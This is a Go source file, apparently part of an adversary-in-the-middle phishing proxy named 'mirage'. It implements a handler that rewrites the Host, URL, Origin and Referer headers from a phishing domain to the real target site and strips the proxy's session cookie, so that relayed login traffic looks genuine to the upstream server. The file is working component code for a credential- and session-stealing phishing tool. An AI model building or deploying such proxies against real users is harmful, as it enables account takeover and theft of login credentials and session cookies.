package request

import (
	"net/http"
	"net/url"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

// URLRewriter rewrites the request URL, Host, Origin, and Referer headers from
// the phishing domain back to the real upstream domain before forwarding.
type URLRewriter struct{}

func (h *URLRewriter) Name() string { return "URLRewriter" }

func (h *URLRewriter) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
	if ctx.Phishlet == nil {
		return nil
	}
	if ph := ctx.Phishlet.FindProxyHost(req.Host); ph != nil {
		origin := ph.OriginHost()
		req.Host = origin
		req.URL.Host = origin
		req.URL.Scheme = ph.UpstreamScheme
	}
	rewriteHeader(req, "Origin", ctx.Phishlet)
	rewriteHeader(req, "Referer", ctx.Phishlet)
	stripCookie(req, proxy.SessionCookieName)
	return nil
}

// rewriteHeader parses the named header as a URL and rewrites the host from
// the phishing domain to the real upstream domain. Handles non-standard ports
// (e.g. Origin: https://login.phish.local:8443 → http://login.target.local).
func rewriteHeader(req *http.Request, header string, p *aitm.Phishlet) {
	parsed, err := url.Parse(req.Header.Get(header))
	if err != nil {
		return
	}
	host := parsed.Hostname()

	for _, ph := range p.ProxyHosts {
		phishHost := ph.PhishSubdomain + "." + p.BaseDomain
		if strings.EqualFold(host, phishHost) {
			parsed.Scheme = ph.UpstreamScheme
			parsed.Host = ph.OriginHost()
			req.Header.Set(header, parsed.String())
			return
		}
	}
}

func stripCookie(req *http.Request, name string) {
	cookies := req.Cookies()
	req.Header.Del("Cookie")
	for _, cookie := range cookies {
		if cookie.Name != name {
			req.AddCookie(cookie)
		}
	}
}

var _ proxy.RequestHandler = (*URLRewriter)(nil)
